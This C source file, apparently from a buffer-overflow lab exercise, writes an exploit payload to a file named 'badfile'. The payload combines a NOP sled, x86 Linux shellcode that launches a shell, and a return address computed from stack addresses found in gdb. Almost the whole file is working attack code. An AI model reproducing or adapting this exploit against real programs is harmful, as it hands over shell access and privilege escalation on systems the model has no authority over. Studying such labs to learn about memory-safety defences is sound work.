// This program creates a file with code that launches a shell //
// exploit.c //


#include <stdlib.h>
#include <stdio.h>
#include <string.h>


char shellcode[] =

   "\x31\xc0" 			/* xor1 	%eax, %eax 	*/
   "\x50" 			/* push1	%eax 		*/
   "\x68""/zsh"			/* push1	$0x68732f2f	*/
   "\x68""/bin" 		/* push1	$0x6e69622f	*/
   "\x89\xe3"			/* mov1		%esp, %ebx	*/
   "\x50"			/* push1	%eax		*/
   "\x53" 			/* push1	%ebx		*/
   "\x89\xe1" 			/* mov1		%esp, %ecx	*/
   "\x99" 			/* cdq				*/
   "\xb0\x0b" 			/* movb		$0x0b, %al	*/
   "\xcd\x80" 			/* int 		$0x80		*/
;


void main(int argc, char **argv)
{

   char buffer[517];
   FILE *badfile;
   int shell_size, offset, buf, ebp, return_add;

	// Initialize the buffer with no-operation instructions (NOP) 0x90 //
	
   memset(&buffer, 0x90, 517);

   shell_size = strlen(shellcode); 

	// Copy the shellcode near the end of the buffer // 

   memcpy(buffer+517-shell_size, shellcode, shell_size);

	// The addresses of the buffer array and ebp were found using gdb //
	// Offset is calculated by adding 4 bytes to the distance between
	// ebp and start of buffery array 				  //

   buf = 0xbfffeb18;
   ebp = 0xbfffeb38;
   offset = ebp - buf + 4;
   return_add	= buf + offset + 100;  // Adding 100 to the return address
				       // I don't think lower values hit the 
				       // NOP sled. 

   memcpy(buffer+offset, &return_add, 4);

   badfile = fopen("./badfile", "w");
   fwrite(buffer, 517, 1, badfile);
   fclose(badfile);

}
